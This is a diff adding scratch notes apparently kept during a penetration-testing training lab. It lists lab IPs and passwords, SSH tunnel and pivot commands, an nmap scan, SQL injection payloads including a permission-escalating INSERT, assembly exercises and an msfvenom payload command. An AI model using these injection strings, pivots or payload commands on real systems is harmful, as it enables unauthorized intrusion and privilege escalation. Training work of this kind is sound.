@@ -1,0 +1,116 @@
+http://10.50.20.250:8000
+JALO-006-M
+IX0wmW3KUVpDzMY
+
+```
+
+gray-host
+
+student@10.50.31.93
+IX0wmW3KUVpDzMY
+
+```
+
+ssh -MS /tmp/gray student@10.50.31.93
+
+ssh -S /tmp/gray gray -O forward -D9050
+ssh -S /tmp/gray gray -O forward -L 41100:<ip>:<desired>
+ssh -S /tmp/gray gray -O forward -L 41101:<ip>:<ssh_port>
+
+ssh -MS /temp/level_2 <user>@<ip> -p <ssh_port> 
+
+
+FOR EVERY SEE PASSED -MS
+FOR EVERY TUNNEL -S
+TO CANCEL TUNNEL -forward to -cancel
+TO KILL ALL TUNNELS close ms tunnel
+```
+
+nmap -v -sT -Pn -T4 --script http-enum.nse <ip> -p <port>
+
+
+cat /home/comrade/Desktop/network/.mapkey.txt
+mdpKhZJqVhdYUDF4zrRU ?
+
+```
+
+
+Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+
+http://<ip>/<>.php?Selection=2 or 1=1; #
+
+http://<ip>/<>.php?Selection=2
+
+
+main:
+	mov rax, 16      # 16 being moved into rax
+	push rax         # push value of rax (16) onto stack
+	jmp mem2         # jump to mem2 location
+	
+mem1:
+	mov rax, 0       # move 0 (error free) exit code to rax
+	ret              # return out of code
+	
+mem2:
+	pop r8           # pop value on the stack (16) into r8
+	cmp rax, r8      # compare rax register (16) to r8 register value (16)
+	je mem1          # jump if comparison has zero bit set to meml
+
+
+
+
+
+main:
+	mov rcx, 25 	  # stores 25
+	mov rbx, 62 	  # stores 62
+	jmp mem1 	  # jump to mem1
+
+mem1:
+	sub rbx, 40 	  # subtract 40 from rbx
+	mov rsi, rbx 	  # copy rbx value to rsi
+	cmp rcx, rsi 	  # compare the values in rcx (25) to rsi (220
+	jmpl mem2 	  # jumps to mem2 location if value is less than or equal
+	
+mem2:
+	mov rax, 0
+	ret
+	
+	
+	
+	
+	
+	
+	
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', '', 'Hacker', 'Hacker', 'UNION INSERT INTO members (permission) VALUES (3);#', 3) 
+
+
+
+
+
+00D9105A | 68 10C0DA00              | push basic1.DAC010                      | DAC010:"Success!\n"
+
+
+
+htjen
+
+
+StudentMidwayPassword
+
+
+
+
+
+
+
+
+
+msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > c:\users\user\desktop\text.txt'
+
+
+
+xfreerdp /u:comrade /v:0.0.0.0 -dynamic-resolution +glyph-cache +clipboard
+
+
+
+
+
